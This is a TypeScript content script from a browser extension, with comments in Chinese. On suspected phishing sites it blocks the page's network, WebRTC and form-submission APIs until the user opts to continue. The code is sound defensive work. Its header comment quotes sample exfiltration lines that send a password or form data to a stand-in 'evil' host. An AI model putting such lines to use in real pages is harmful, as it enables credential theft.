/**
 * 钓鱼仿冒站点防护 —— MAIN world 段（页面 JS 层的能力封锁）。
 *
 * 移植自源用户脚本 `src/core/mutex.ts`，但比源项目多堵了几个口子：源项目只换
 * `fetch` / `XMLHttpRequest` / `WebSocket`，而页面能把数据送出去的手段远不止这三个——
 * `new Image().src = '//evil/?q=' + password`、`navigator.sendBeacon`、
 * `<form action="//evil/collect" method="POST">`、WebRTC data channel……
 *
 * **主防线已经不在这一层**：`background/runtime/guardRules.ts` 用 DNR session 规则在该标签页上
 * 直接 block 掉除顶层导航外的一切请求（img / 字体 / 表单 / 跨域 iframe / Worker 都算）。
 * 这里保留并扩展桩函数，针对的是 DNR 结构上管不到的两块：
 * 1. **下发前的窗口期**：DNR 规则要走一趟后台，而本脚本在 `document_start` 同步执行；
 * 2. **非网络栈能力**：WebRTC 的 data channel 不经过 DNR，只能在 JS 层掉；
 *    表单 `submit()` 是同步调用，拦在方法与事件上比等网络层更直接。
 *
 * 为什么必须在 MAIN world：ISOLATED world 与页面是不同的 JS 环境，改不到页面的
 * `window.fetch`；只有 MAIN 才能覆盖页面自己的网络 API。
 *
 * 注意：本入口不使用任何 `browser.*` API（同 `content/mainWorld.ts`），
 * 构建时同样跳过 globals shim，避免向页面全局写入 `window.browser`。
 */
import { GUARD_CONTINUE_EVENT } from './protocol'
import { classifyHost } from '../../shared/site'

const BLOCKED_MESSAGE = 'Blocked by Iwara Assistant: suspected phishing site'

if (classifyHost(location.hostname) === 'suspicious') {
    /** 原生实现引用：用户明确选择「继续访问」（或后台已放行）时原样换回去 */
    const nativeFetch = window.fetch
    const nativeXhrOpen = XMLHttpRequest.prototype.open
    const nativeWebSocket = window.WebSocket
    const nativeEventSource = window.EventSource
    const nativeSendBeacon = navigator.sendBeacon
    const nativeRtcPeerConnection = window.RTCPeerConnection
    const nativeFormSubmit = HTMLFormElement.prototype.submit
    const nativeFormRequestSubmit = HTMLFormElement.prototype.requestSubmit

    /**
     * 必须是**函数声明**而不是箭头函数：页面用 `new WebSocket(...)` / `new RTCPeerConnection()`
     * 调用时，箭头函数不可构造，抛的是引擎的「not a constructor」——既不是我们的文案，
     * 也把「为什么被拦」藏起来了。函数声明可被 `new`，于是走的还是这句抛错。
     */
    function refuse(): never {
        throw new Error(BLOCKED_MESSAGE)
    }

    /**
     * 表单提交既不走 fetch 也不走 XHR，`form.submit()` 甚至不触发 `submit` 事件，
     * 所以既要换方法，也要在捕获阶段掉事件（用户点击提交按钮走的是后者）。
     */
    const stopSubmit = (event: Event): void => {
        event.preventDefault()
        event.stopImmediatePropagation()
    }

    window.fetch = (() => Promise.reject(new TypeError(BLOCKED_MESSAGE))) as typeof window.fetch
    XMLHttpRequest.prototype.open = refuse as typeof XMLHttpRequest.prototype.open
    // WebSocket / EventSource 是构造函数：直接赋一个新函数即可（页面读取 .OPEN 等静态常量时
    // 会拿到 undefined，但那属于「已经被封」的页面，不影响我们的判断）
    window.WebSocket = refuse as unknown as typeof WebSocket
    window.EventSource = refuse as unknown as typeof EventSource
    // sendBeacon 的契约是「返回是否已排队」，返回 false 比抛错更贴合语义（不打断页面逻辑）
    navigator.sendBeacon = (() => false) as typeof navigator.sendBeacon
    // WebRTC 的 data channel 不经过 HTTP 栈，DNR 管不到
    window.RTCPeerConnection = refuse as unknown as typeof RTCPeerConnection
    HTMLFormElement.prototype.submit = refuse as typeof HTMLFormElement.prototype.submit
    HTMLFormElement.prototype.requestSubmit = refuse as typeof HTMLFormElement.prototype.requestSubmit
    window.addEventListener('submit', stopSubmit, true)

    /**
     * 解除封锁：只恢复一次并移除监听，避免页面反复派发该事件来重置状态。
     * ISOLATED 侧在两个时机派发：用户点「继续访问」，或后台判定本页已放行。
     */
    window.addEventListener(
        GUARD_CONTINUE_EVENT,
        () => {
            window.fetch = nativeFetch
            XMLHttpRequest.prototype.open = nativeXhrOpen
            window.WebSocket = nativeWebSocket
            window.EventSource = nativeEventSource
            navigator.sendBeacon = nativeSendBeacon
            window.RTCPeerConnection = nativeRtcPeerConnection
            HTMLFormElement.prototype.submit = nativeFormSubmit
            HTMLFormElement.prototype.requestSubmit = nativeFormRequestSubmit
            window.removeEventListener('submit', stopSubmit, true)
        },
        { once: true }
    )
}

export {}
